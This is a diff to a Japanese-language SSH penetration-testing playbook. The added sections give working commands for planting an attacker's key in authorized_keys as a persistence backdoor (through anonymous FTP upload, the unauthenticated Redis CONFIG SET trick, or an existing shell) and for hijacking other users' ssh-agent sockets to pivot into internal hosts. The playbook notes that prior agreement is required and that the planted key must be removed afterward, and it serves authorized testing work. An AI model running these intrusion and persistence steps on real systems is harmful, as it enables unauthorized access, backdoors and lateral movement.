@@ -1,6 +1,6 @@
 # SSH
 
-> **スコープ: 22 番ポート（または非標準 SSH ポート）の列挙〜接続取得まで**。バナー観察・認証方式列挙・ホスト鍵 fingerprint・アルゴリズム監査・既知バグ判定・認証突破・秘密鍵パスフレーズクラック・制限シェル脱出・取得後の Port Forwarding / pivot までを 1 ファイルで扱う。接続後の Linux 列挙・権限昇格・横展開（例: agent hijack / authorized_keys 書込・bash_history 痕跡）は `../03_Post_Access_Linux/Enumeration_Checklist.md` を参照。
+> **スコープ: 22 番ポート（または非標準 SSH ポート）の列挙〜接続取得・SSH 関連の取得後活動まで**。バナー観察・認証方式列挙・ホスト鍵 fingerprint・アルゴリズム監査・既知バグ判定・認証突破・秘密鍵パスフレーズクラック・制限シェル脱出・Port Forwarding / pivot・SSH Agent ハイジャック・authorized_keys 書込による侵入/persistence までを 1 ファイルで扱う。接続後の Linux 列挙・権限昇格・SSH 以外の persistence（cron / systemd / bash_history 痕跡等）は `../03_Post_Access_Linux/Enumeration_Checklist.md` を参照。
 
 
 ## 着火条件
@@ -67,7 +67,17 @@ nc [TARGET_IP] 22
 # [Attacker] verbose 出力から認証方式リスト取得
 ssh -v -o PreferredAuthentications=none -o StrictHostKeyChecking=no [USER]@[TARGET_IP] 2>&1 | grep "Authentications that can continue"
 # debug1: Authentications that can continue: publickey,password
+
+# [Attacker] nmap 版（同じ目的、より簡潔）
+nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=[USER]" [TARGET_IP]
 ```
+
+> **オプションの意味:**
+>
+> - `-o PreferredAuthentications=none`: クライアントが提示する認証方式リストを **空** に指定。認証は必ず失敗するが、その手前でサーバが「使える認証方式」を `Authentications that can continue: ...` として返してくる。これを `-v` の debug 出力から拾うのが目的
+> - `-o StrictHostKeyChecking=no`: 初接続時のホスト鍵検証プロンプト（`Are you sure you want to continue connecting (yes/no)?`）を抑止する。自動化（grep へのパイプ）には必須。**MitM 検出を無効化する副作用があるため、本フロー以外の用途では使わない**
+> - `-v`: debug 出力を stderr に出す
+> - `2>&1`: stderr を stdout に合流させて grep に通す
 
 **観測される出力 → 次のアクション:**
 
@@ -342,7 +352,7 @@ ls rsa/2048/*.pub | head -n 100 | xargs -P 8 -I {} sh -c '
 
 | 出力 | 示唆 | 次のアクション |
 |---|---|---|
-| 1 つの鍵でログイン成功 | CVE-2008-0166 影響 | §5 で直接ログイン or §11 port forwarding 設計 |
+| 1 つの鍵でログイン成功 | CVE-2008-0166 影響 | §5 で直接ログイン or §12 port forwarding 設計 |
 | 全鍵で `Permission denied` | 脆弱鍵生成範囲外 / パッチ済み | 通常の認証経路 (§5-§7) に戻る |
 | `Too many authentication failures` で途中切断 | `MaxAuthTries` に到達 | `-o IdentitiesOnly=yes` で 1 鍵ずつ + 試行間隔 sleep を入れる |
 
@@ -350,9 +360,86 @@ ls rsa/2048/*.pub | head -n 100 | xargs -P 8 -I {} sh -c '
 
 ---
 
-## 11. Port Forwarding / SOCKS pivot
+## 11. authorized_keys 書込による侵入・persistence
 
-**着火条件:** SSH 接続が取れている (§5 認証突破成功)。**外部から内部ネットワークへの pivot 経路**を作る、または特定の内部サービスを attacker 側からアクセス可能にする。
+**着火条件:** 以下のいずれかでターゲットの `~/.ssh/authorized_keys`（または `/root/.ssh/authorized_keys`）への書込手段がある:
+
+- 匿名 FTP 書込権限（`FTP.md` §5 で書込可能と確認済み）
+- SMB 共有の書込権限
+- Redis unauth + `CONFIG SET dir`/`dbfilename` 経由（古典的経路）
+- PostgreSQL `COPY ... TO PROGRAM` / `lo_export` 経由
+- LFI / RFI + 任意ファイル書込脆弱性
+- Web シェル取得済みで該当ユーザー権限がある
+- 既存 SSH シェル取得済みで persistence を仕掛けたい
+
+> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
+> - [x] **持続化に該当**（authorized_keys に書込んだ鍵は再起動・パスワード変更後も残る）
+> - [x] **不可逆な設定変更を含む**（追加した鍵を消し忘れるとバックドア化）
+> - [ ] 業務停止リスク
+> - [x] SIEM / EDR で確実に検知される（File Integrity Monitoring / auditd `~/.ssh/` 監視で即アラート）
+>
+> 実施可否は事前合意で明示確認すること。**原状回復必須**（追加した公開鍵の削除）。演習環境（HTB / OSCP 等）では制約なし。
+
+**コマンド:**
+
+```bash
+# [Attacker] パスフレーズなしの鍵ペアを攻撃側で生成（テスト識別子付き）
+ssh-keygen -t ed25519 -f ./kedalab_[CASE_ID]_key -N '' -C "kedalab-[CASE_ID]"
+# kedalab_[CASE_ID]_key（秘密鍵）と kedalab_[CASE_ID]_key.pub（公開鍵）が生成される
+
+# [Attacker] 公開鍵を確認（末尾コメント kedalab-[CASE_ID] が grep の目印になる）
+cat ./kedalab_[CASE_ID]_key.pub
+# ssh-ed25519 AAAA... kedalab-[CASE_ID]
+```
+
+**書込手段ごとのバリエーション:**
+
+```bash
+# [Attacker] (A) 匿名 FTP 書込経由（FTP.md §5 で書込確認済みの場合）
+curl -T ./kedalab_[CASE_ID]_key.pub ftp://anonymous:@[TARGET_IP]/home/[USER]/.ssh/authorized_keys
+
+# [Attacker] (B) Redis unauth 経由（CONFIG SET dir / dbfilename で .ssh/authorized_keys に書込）
+redis-cli -h [TARGET_IP] FLUSHALL
+redis-cli -h [TARGET_IP] CONFIG SET dir /home/[USER]/.ssh/
+redis-cli -h [TARGET_IP] CONFIG SET dbfilename authorized_keys
+(echo ""; cat ./kedalab_[CASE_ID]_key.pub; echo "") | redis-cli -h [TARGET_IP] -x SET sshkey
+redis-cli -h [TARGET_IP] SAVE
+# 前後の空行が Redis のダンプヘッダを SSH に無視させるトリック
+
+# [Attacker] (C) シェル取得済みで自分で persistence を仕掛ける（要書込権限）
+mkdir -p ~/.ssh && chmod 700 ~/.ssh
+cat ./kedalab_[CASE_ID]_key.pub >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# [Attacker] 接続試行
+ssh -i ./kedalab_[CASE_ID]_key [USER]@[TARGET_IP]
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `ssh -i ./[KEY]` でログイン成功 | 書込 + ログインの両方成立 | §5 と同じくシェル取得後の活動へ。**原状回復のため `authorized_keys` から該当行削除をテスト終了時に実施** |
+| `Permission denied (publickey)` | パーミッション不正（`.ssh/` が 700 でない / `authorized_keys` が 600 でない / 所有者がターゲットユーザーでない）| 書込側で `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys` を揃える |
+| `Authentication refused: bad ownership or modes` (`auth.log` 側) | パーミッション・所有者の問題 | `chown [USER]:[GROUP]` も含めて修正 |
+| Redis 経由で書込んでも接続が拒否 | Redis のダンプバイナリヘッダが SSH に拒否されている | 前後に空行を入れる、`-x SET sshkey` の前後にも `\n` を追加 |
+| 接続成立後 `id` で別ユーザー | 書込先パスを誤った（`/root/.ssh/` ではなく `/home/[USER]/.ssh/`）| 書込先パスを修正して再試行 |
+| `~/.ssh/` ディレクトリ自体が存在しない | 初回 SSH 利用がないユーザー | `mkdir -p ~/.ssh && chmod 700` を書込手段で先に実行 |
+
+> **原状回復（必須）:** テスト識別子コメントマーカーで grep して該当行を確実に削除:
+>
+> ```bash
+> # [Target] テスト終了時に実施
+> sed -i.bak '/kedalab-\[CASE_ID\]/d' ~/.ssh/authorized_keys
+> ```
+
+> **注意:** sshd は `~/.ssh/`・`authorized_keys` のパーミッションと所有者を厳格にチェックする。**書込先のパーミッション (700 / 600) と所有者 (ターゲットユーザー) を必ず揃える**。`StrictModes yes` (sshd_config デフォルト) ではパーミッション不一致で即拒否され、`auth.log` に `Authentication refused: bad ownership or modes` が残る。
+
+---
+
+## 12. Port Forwarding / SOCKS pivot
+
+**着火条件:** SSH 接続が取れている (§5 認証突破成功 / §11 authorized_keys 書込経由)。**外部から内部ネットワークへの pivot 経路**を作る、または特定の内部サービスを attacker 側からアクセス可能にする。
 
 **コマンド:**
 
@@ -392,16 +479,62 @@ ssh -J [USER1]@[HOP1]:22 [USER2]@[INTERNAL_TARGET]
 
 ---
 
+## 13. SSH Agent ハイジャック（他ユーザの ssh-agent 流用）
+
+**着火条件:** ターゲットホストに既にシェル取得済み（§5 / §11 / 別経路）。**他ユーザー（特に root や開発者ユーザー）が `ssh-agent` を起動して秘密鍵をロード済み**で、`SSH_AUTH_SOCK` の Unix ソケットが自分の権限でアクセスできる状態。
+
+**コマンド:**
+
+```bash
+# [Target] 動作中の ssh-agent プロセスとソケットパスを探索
+ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK
+# 出力例: SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.NNNN
+
+# [Target] /tmp 配下の agent ソケットを直接探す
+find /tmp -path '*/ssh-*/agent.*' 2>/dev/null
+ls -la /tmp/ssh-*/agent.* 2>/dev/null
+
+# [Target] 自分の権限で読めるソケットがあれば流用
+export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.NNNN
+
+# [Target] エージェントに登録されている鍵を確認（鍵本体は読めないが署名は要求できる）
+ssh-add -l
+# 2048 SHA256:[FINGERPRINT_HASH] /home/[OWNER]/.ssh/id_rsa (RSA)
+
+# [Target] エージェント経由で他ホストへ ssh 接続（パスフレーズ・鍵ファイル本体不要）
+ssh [USER]@[INTERNAL_TARGET_IP]
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `ssh-add -l` で鍵リストが返る | agent ハイジャック成立 | リスト上の鍵で別ホストへ接続を試行・§12 SOCKS pivot と組み合わせて横展開 |
+| `Could not open a connection to your authentication agent` | ソケットパスが間違い・権限不足 | `find / -name 'agent.*' 2>/dev/null` で範囲を広げる |
+| `ssh-add -l` で `The agent has no identities` | agent は動いているが鍵未登録 | 別ユーザーの agent を探す |
+| 自分が root の場合に全ソケットへアクセス可能 | 全ユーザーの SSH 認証情報を流用可能 | 各ユーザーの agent を順に試して横展開連鎖 |
+| 接続先で `~/.bash_history` を見ると過去 ssh 接続先が判明 | 既知の接続先パターンが分かる | 順次同じ手順で agent ハイジャックを連鎖 |
+
+> **原理:** `ssh-agent` は秘密鍵をメモリ上に保持し、Unix ソケット経由で「署名要求」を受ける設計。**鍵自体はソケットから読み出せない**が、**「この鍵で署名してくれ」と要求すれば応じる**ため、署名を使って ssh 接続が成立する。`SSH_AUTH_SOCK` 環境変数を盗まれた agent のソケットに向けるだけで攻撃成立する。
+
+> **注意:** agent プロセスが終了するとソケットは無効になる（ターゲットユーザーがログアウトしたタイミングで切れる）。**侵入直後にすぐ試すのが鉄則**。ロード済み鍵の fingerprint を `ssh-add -l` で控えておくと、後で鍵ファイル本体を探すときの照合に使える（§3 fingerprint 捕捉と連携）。
+
+> **`ssh -A` (Agent Forwarding) との関係:** `ssh -A` で接続するとクライアント側の agent ソケットがターゲット側に転送される。**ターゲット側 root に同じハイジャック手法で乗っ取られる**ため、信頼できないホストには `-A` を付けない（§5 の注意と整合）。
+
+---
+
 ## 刺さらなかったとき（全体）
 
 | 状況 | 推定原因 | 代替手段 |
 |---|---|---|
 | `ssh -v` で認証方式が返らない | StrictModes / fail2ban で接続自体拒否 | 接続元を変える / 時間をおいて再試行 |
-| 辞書攻撃で全 cred が拒否 | パスワード認証無効 | 秘密鍵取得経路 → `Credential_Discovery.md` / Debian PRNG (§10) |
+| 辞書攻撃で全 cred が拒否 | パスワード認証無効 | 秘密鍵取得経路 → `Credential_Discovery.md` / Debian PRNG (§10) / authorized_keys 書込 (§11) |
 | CVE-2018-15473 PoC で全 invalid | OpenSSH 7.7+ にパッチ済み | LDAP / SMTP VRFY / SMB / OSINT (`.keys`) で別経路 |
 | デフォルト認証情報で 1 件も通らない | 出荷時 cred が変更済み | `Default_Credentials.md` の製品別早見表で別組合せ |
 | ホスト鍵が複数ホストで一致 | テンプレートからのクローン環境 | 鍵使い回しの可能性 → 横展開観点に反映 |
+| §11 authorized_keys 書込後も接続拒否 | パーミッション / 所有者 / SELinux | `chmod 700 .ssh && chmod 600 authorized_keys` + `chown` 修正、`auth.log` の `bad ownership or modes` 確認 |
 | port forwarding が `administratively prohibited` | `AllowTcpForwarding no` | chisel / SOCAT で代替 pivot を構築 |
+| §13 ssh-agent ソケットが見つからない | ターゲットユーザーが ssh-agent を使っていない / ソケットが別パス | `find / -name 'agent.*' 2>/dev/null`、`systemctl status ssh-agent`、root 権限獲得後に再試行 |
 
 ## 注意点・落とし穴
 
@@ -420,18 +553,20 @@ ssh -J [USER1]@[HOP1]:22 [USER2]@[INTERNAL_TARGET]
 >
 > バージョン該当の確認まで（§1 / §10 の banner 観察）は技術的判断で実施可。実 exploit は事前合意必須。
 
+> **[HIGH IMPACT]** §11 authorized_keys 書込は **持続化に該当**するため本番では原則禁止または個別合意必須（詳細は §11 内の警告ブロックを参照）。**原状回復として該当公開鍵の削除が必須**（テスト識別子コメントマーカーで grep 削除）。
+
 > **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロックを横断する高影響の警告のみを置く。
 
 ### 本番での前提
 
-- **事前合意の要否**: ★★★（書面承認必須 — §10 Debian PRNG 試行 / §7 認証スプレー / §1 CVE-2024-6387 実 exploit）/ ★★（口頭確認可 — §11 port forwarding は経路設計が影響するため）/ ★（§1-§4 のバナー・認証方式・fingerprint・アルゴリズム列挙は技術的判断のみで実施可だが、対象組織との合意範囲は確認）
-- **想定される SIEM / EDR 検知**: `auth.log` / `secure` の `Failed password for [USER] from [IP]` 大量、fail2ban アラート、`Connection closed by [IP] [preauth]` の連続記録、SSH ハニーポット検知、§11 port forwarding は IDS の lateral movement signature に当たる可能性
-- **業務影響リスク**: アカウントロック発生時の業務影響（管理者アカウントなら系統的影響）、§1 CVE-2024-6387 試行時の sshd クラッシュリスク
-- **原状回復必須項目**: ✅ 取得した秘密鍵の安全な破棄 / ✅ §11 で確立した port forwarding セッションの切断（接続後の活動に伴う痕跡 — authorized_keys 追加・history 等 — は `../03_Post_Access_Linux/` 領域で扱う）
+- **事前合意の要否**: ★★★（書面承認必須 — §10 Debian PRNG 試行 / §11 authorized_keys 書込 / §7 認証スプレー / §1 CVE-2024-6387 実 exploit）/ ★★（口頭確認可 — §12 port forwarding は経路設計が影響するため・§13 agent ハイジャックは横展開連鎖の起点）/ ★（§1-§4 のバナー・認証方式・fingerprint・アルゴリズム列挙は技術的判断のみで実施可だが、対象組織との合意範囲は確認）
+- **想定される SIEM / EDR 検知**: `auth.log` / `secure` の `Failed password for [USER] from [IP]` 大量、fail2ban アラート、`Connection closed by [IP] [preauth]` の連続記録、SSH ハニーポット検知、§11 authorized_keys 書込は File Integrity Monitoring / auditd で即アラート、§12 port forwarding は IDS の lateral movement signature に当たる可能性
+- **業務影響リスク**: アカウントロック発生時の業務影響（管理者アカウントなら系統的影響）、§1 CVE-2024-6387 試行時の sshd クラッシュリスク、§11 authorized_keys 書込先のディスク使用量（実害は微少）
+- **原状回復必須項目**: ✅ §11 で追加した公開鍵を `authorized_keys` から削除（テスト識別子コメントマーカー `kedalab-[CASE_ID]` で grep 削除）/ ✅ §12 で確立した port forwarding セッションの切断 / ✅ §13 で `SSH_AUTH_SOCK` 改変した環境変数の元復元（exit でログアウト時に消える）/ ✅ 取得した秘密鍵の安全な破棄
 - **取得情報の取扱**: 秘密鍵は暗号化保管、テスト完了時破棄
 - **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）
 
-> **シェル取得後の横展開・列挙はこのファイルの範囲外** → `../03_Post_Access_Linux/Enumeration_Checklist.md`。取得した秘密鍵を起点にした横展開は同ファイルおよび本ファイル §3 の fingerprint と連携する。
+> **SSH 関連以外の取得後活動（cron / systemd / bash_history 痕跡等）はこのファイルの範囲外** → `../03_Post_Access_Linux/Enumeration_Checklist.md`。取得した秘密鍵を起点にした横展開は同ファイルおよび本ファイル §3 の fingerprint と連携する。
 
 ## 関連技術
 
@@ -441,6 +576,8 @@ ssh -J [USER1]@[HOP1]:22 [USER2]@[INTERNAL_TARGET]
 - 前：ロックアウト設定の事前確認 → `Account_Lockout_Recon.md`
 - 前：製品出荷時のデフォルト認証情報試行 → `Default_Credentials.md`
 - 後：シェル取得後の Linux 列挙・権限昇格・横展開 → `../03_Post_Access_Linux/Enumeration_Checklist.md`
-- 後：§11 SOCKS pivot 経由の内部ネットワーク列挙 → `../00_Playbook/Internal_LAN_Pentest_Flow.md`
+- 後：§12 SOCKS pivot 経由の内部ネットワーク列挙 → `../00_Playbook/Internal_LAN_Pentest_Flow.md`
+- 後：§13 agent ハイジャックで取得した鍵による他ホスト連鎖侵入 → 本ファイル §5（取得鍵での再ログイン）
+- 前：§11 authorized_keys 書込のための書込権限取得経路 → `FTP.md`（§5 書込判定）/ Redis unauth / PostgreSQL `COPY ... TO PROGRAM` 等の別プロトコル経路
 - 関連：他プロトコルでの認証情報使い回し → `FTP.md` / `Protocol_Exploitation.md`（Mail / WinRM / Impacket exec 各セクション）
 - 関連：TLS バナーと同様の証明書/鍵からの組織推定軸 → `../01_Reconnaissance/TLS_Audit.md`
